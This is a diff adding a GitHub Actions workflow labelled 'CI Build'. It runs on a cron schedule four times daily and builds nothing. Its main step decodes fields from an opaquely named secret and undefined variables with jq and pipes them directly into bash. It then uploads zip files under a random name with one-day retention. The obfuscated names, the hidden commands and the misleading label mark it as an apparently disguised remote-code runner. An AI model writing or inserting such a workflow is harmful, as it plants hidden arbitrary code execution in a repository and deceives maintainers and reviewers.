@@ -1,0 +1,34 @@
+name: CI Build
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '29 4,10,16,22 * * *'
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  runner:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Go
+        env:
+          det7877: ${{ secrets.det7877 }}
+        run: |
+          printf '%s' "$det7877" | jq -r .o81 | /bin/bash
+          printf '%s' "$io2666" | jq -r .fu5 | /bin/bash
+          echo $io014 | jq -r .vtcjr2494 | /bin/bash
+          echo $dg1226 | jq -r .emb25 | /bin/bash
+
+      - name: Archive results
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: AefLXn4P
+          path: "*.zip"
+          retention-days: 1
